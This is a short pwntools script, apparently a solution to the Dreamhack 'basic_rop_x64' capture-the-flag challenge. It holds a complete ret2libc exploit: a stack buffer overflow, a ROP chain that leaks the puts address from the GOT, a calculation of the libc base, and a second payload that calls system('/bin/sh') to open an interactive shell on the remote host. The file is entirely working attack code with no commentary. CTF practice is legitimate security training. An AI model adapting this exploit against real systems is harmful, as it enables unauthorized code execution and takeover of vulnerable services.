from pwn import *

p = remote("host3.dreamhack.games", 13726)
e = ELF("./basic_rop_x64")
l = ELF("./libc.so.6")

puts_plt = e.plt['puts']
puts_got = e.got['puts']
prdi = 0x400883 

pay = 'a' * 0x48
pay += p64(prdi)
pay += p64(puts_got)
pay += p64(puts_plt)
pay += p64(e.sym['main'])

p.send(pay)
p.recv(0x40)
puts_addr = u64(p.recv(6) + "\x00\x00")
base = puts_addr - l.sym['puts']
system = base + l.sym['system']
binsh = base + next(l.search("/bin/sh"))

pay = 'a' * 0x48 
pay += p64(prdi)
pay += p64(binsh)
pay += p64(system)

p.send(pay)
p.interactive()
